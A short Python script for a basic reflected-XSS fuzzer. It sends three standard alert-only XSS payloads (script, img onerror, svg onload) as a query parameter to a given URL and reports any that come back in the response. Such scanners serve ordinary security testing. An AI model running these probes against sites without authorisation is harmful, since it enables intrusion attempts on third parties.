#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich XSS Fuzzer"""

from rich.console import Console
from rich.progress import Progress
import requests

console = Console()

class XSSFuzzer:
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
    
    def fuzz(self, url):
        """Fuzz for XSS"""
        console.print(f"[bold cyan]Fuzzing: {url}[/bold cyan]")
        
        for payload in self.payloads:
            try:
                response = requests.get(f"{url}?q={payload}")
                if payload in response.text:
                    console.print(f"[red]✓ XSS found: {payload}[/red]")
            except:
                pass

if __name__ == "__main__":
    fuzzer = XSSFuzzer()
    console.print("[yellow]XSS fuzzer[/yellow]")

